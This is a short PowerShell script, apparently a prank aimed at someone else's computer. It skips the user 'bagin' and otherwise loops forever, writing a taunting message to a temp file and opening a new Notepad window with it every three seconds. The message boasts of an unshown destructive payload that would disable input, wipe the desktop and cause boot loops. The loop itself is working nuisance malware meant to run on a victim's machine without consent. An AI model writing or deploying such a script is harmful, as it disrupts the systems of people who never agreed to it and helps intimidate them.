if ($env:Username -eq "bagin") {
    exit 0
}

$text = @'
If you're seeing this message, it means I let you.

You were never in control — not for a second.

I had everything prepped: a full payload, elegant and catastrophic. You wouldn’t have noticed it until it was far too late. Let me walk you through what could have happened.

The mouse? Useless.
Keyboard? Dead on arrival.
File Explorer? Wiped from existence — no icons, no taskbar, no text. Just void.
Microphone? Sound input? Disabled at the driver level.
The screen? Tilted 90 degrees and color-inverted — your neck would snap and your eyes would scream trying to look at it.

But that’s just the warm-up act.

Upon startup, the real fun begins: an infinite boot loop — 10 seconds of agony before it reboots itself. Over. And over. And over.

Restoration? Good luck. No interface. No input. Constant reboots. No escape.

And the best part? I tested it — on a VM. It was nearly impossible to recover. I got lucky — I had the restore script in Explorer's quick access, and I triggered it just before the next reboot cycle hit.

The same way I ran this on your PC without touching it, the big PowerShell script would execute silently.
No console. No CTRL+C. No admin rights.

But here's the real joke: I didn’t run it on your system.

Because I didn’t need to.

It was enough for me to know how destructive my script is.
I’ve already won — because the punchline is what I could’ve done.
'@

$noticePath = "$env:TEMP\system_notice.txt"
while ($true) {
    $text | Set-Content -Path $noticePath -Encoding UTF8
    Start-Process notepad.exe -ArgumentList $noticePath
    Start-Sleep -Seconds 3
}

